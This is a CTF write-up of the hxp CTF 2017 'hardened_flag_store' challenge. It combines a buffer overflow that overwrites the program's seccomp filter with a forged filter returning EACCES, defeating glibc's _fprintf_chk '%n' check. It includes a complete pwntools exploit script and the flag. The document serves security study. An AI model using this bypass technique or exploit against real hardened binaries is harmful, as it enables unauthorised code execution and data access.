---
title: hxp CTF 2017 -- hardened_flag_store
tags:
  - CTF
  - Pwnable
  - Python
  - BOF
  - format_string
  - seccomp
  - hxp
categories:
  - write-ups
date: 2017-11-20 19:18:00
---
**Category:** Pwnable

64 bit ELF with PIE, NX, FULL RELRO enabled 

<!-- more -->  

The program will read a secret string from "secret.txt" and store the string address on stack. Then it will use seccomp to create a whitelist of syscalls. We can analyze the filter by using [seccomp-tools](https://github.com/david942j/seccomp-tools):  

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL
```

So now the program are only allowed to use the following system calls: `exit`, `read`, `write`, `open` and `close`.  

After that the program will do the following ( pseudo code ) :  

```c
int cnt = 16;
int has_seccomp = 0;
while (cnt--)
{
    read(0, input, 96); // read user input
    if (!has_seccomp) init_seccomp(); // set up seccomp rule
    len = strlen(secret_string) + 1;
    for ( i = 0LL; ; i++ ) // check if input == secret_string
    {
        if ( len - 1 == i )
            goto LABEL_19;
        if ( secret_string[i] != input[i] )
            break;
    }
    puts("Wrong secret :/");
    if ( strlen(secret_string) == i )
LABEL_19:
        openflag(); // input == secret_string, open flag.txt and print it to stdout
    _fprintf_chk(stderr, 1LL, input); // <-- format string vuln
    has_seccomp = 1;
}
```

We can spot a format string vulnerability @ line 19. Although the secret string's address is stored on stack, however the output of `_fprintf_chk` is set to stderr, so we can't use `%s` to leak the secret string.  

But there's still one way to bypass the check. At line 16:  

```c
if ( strlen(secret_string) == i )
LABEL_19:
        openflag(); // input == secret_string, open flag.txt and print it to stdout
```

If we can overwrite the first character of the secret string to a null byte, and input a random string, both `strlen(secret_string)` and `i` will be `0`, thus bypass the check and will print out the flag.  

However this will require us to use the `%n` format string payload -- which in this case will be blocked by the seccomp filter:  

```
$ ./flag_store
%n
Wrong secret :/
[1]    5295 invalid system call  ./flag_store
```

Fortunately my teammate found that there's a buffer overflow vulnerability while reading the user input. We can input at most 96 chars to the buffer, while its size is only 32. Moreover, this make us able to overwrite the seccomp rule ! So then we overwrite the seccomp rule with a bunch of null bytes and send the `%n` character:

```
[*] Sending null bytes
[*] Sending fmt payload
[*] Switching to interactive mode
Wrong secret :/
Wrong secret :/
*** %n in writable segment detected ***
[*] Got EOF while reading in interactive
```

OK, so we successfully overwrite the seccomp rule, but still the `%n` payload was blocked by `_fprintf_chk`, which is a more secure version of `fprintf`. At this point I started to think that maybe we need to write some seccomp rules to bypass the format string check.

And so I started reading the [glibc source code](https://code.woboq.org/userspace/glibc/stdio-common/vfprintf.c.html#__readonly_area):

```c
................
    {                                                                      \
      extern int __readonly_area (const void *, size_t)                      \
        attribute_hidden;                                              \
      readonly_format                                                      \
        = __readonly_area (format, ((STR_LEN (format) + 1)              \
                                    * sizeof (CHAR_T)));              \
    }                                                                      \
  if (readonly_format < 0)                                              \
    __libc_fatal ("*** %n in writable segment detected ***\n");              \
}  
```

Hmmmm, looks like we'll have to make `readonly_format >= 0` so it won't call `__libc_fatal ("*** %n in writable segment detected ***\n");`. Let's trace into the [__readonly_area() function](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/readonly-area.c.html#__readonly_area):

```c
__readonly_area (const char *ptr, size_t size)
{
  const void *ptr_end = ptr + size;

  FILE *fp = fopen ("/proc/self/maps", "rce");
  if (fp == NULL)
    {
      /* It is the system administrator's choice to not have /proc
         available to this process (e.g., because it runs in a chroot
         environment.  Don't fail in this case.  */
      if (errno == ENOENT
          /* The kernel has a bug in that a process is denied access
             to the /proc filesystem if it is set[ug]id.  There has
             been no willingness to change this in the kernel so
             far.  */
          || errno == EACCES)
        return 1;
      return -1;
    }
    ...................
```

Ah ha ! We can see that `__readonly_area` will call `fopen()`, and see if its `errno` is equals to `EACCES` or `ENOENT`. **If so, it will return 1** !! Since we can write our own seccomp rule, we can totally make this happen !

So first we create our own seccomp rule:

```
# # check if arch is X86_64
A = arch
A == 0xc000003e ? next : ok
A = sys_number
A == open ? next : ok
A = args[2]
A == 0x1b6 ? magic : ok # check the 3rd arg of open()
magic:
return ERRNO(13) # ERRNO(EACCES)
ok:
return ALLOW
```

Notice that in order to make `open("flag.txt", 0x80000)` ( in the `openflag()` function ) works normally, we'll have to add the rule `A == 0x1b6 ? magic : ok`. This indicates that if the 3rd argument of `open()` equals to `0x1b6`, return `ERRNO(13)`, otherwise allow the system call. I wrote this rule because I found that when `__readonly_area()` calls `fopen ("/proc/self/maps", "rce");`, the 3rd argument of `open()` was exactly `0x1b6`.  

By using the [asm](https://github.com/david942j/seccomp-tools#asm) feature of the seccomp-tools, we can generate the raw bytes of our seccomp rule:

```
$ cat ./rule 
# # check if arch is X86_64
A = arch
A == 0xc000003e ? next : ok
A = sys_number
A == open ? next : ok
A = args[2]
A == 0x1b6 ? magic : ok
magic:
return ERRNO(13)
ok:
return ALLOW

$ seccomp-tools asm ./rule
" \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05>\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"

```

At last we apply our seccomp rule, exploit the format string vulnerability to bypass the check and get the flag:

```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

# from brucepwn import *

HOST = "35.198.105.104"
PORT = 10000
ELF_PATH = "./flag_store"
LIBC_PATH = ""

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object
libc = elf.libc if not LIBC_PATH else ELF(LIBC_PATH)
if not libc: log.warning("Failed to load libc")

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = elf.process() # elf.process(argv=[argv1, argv2,...])

    payload = "\x00"*0x20
    payload += " \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05>\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"
    print "len:", len(payload)
    assert len(payload) <= 96
    r.sendline(payload)
    time.sleep(1)
    r.sendline("%128c%128c%hhn")
    time.sleep(1)
    r.sendline("1")
    r.interactive()


```

flag: `hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}`


First blood on this one ! WOOHOO ! 😎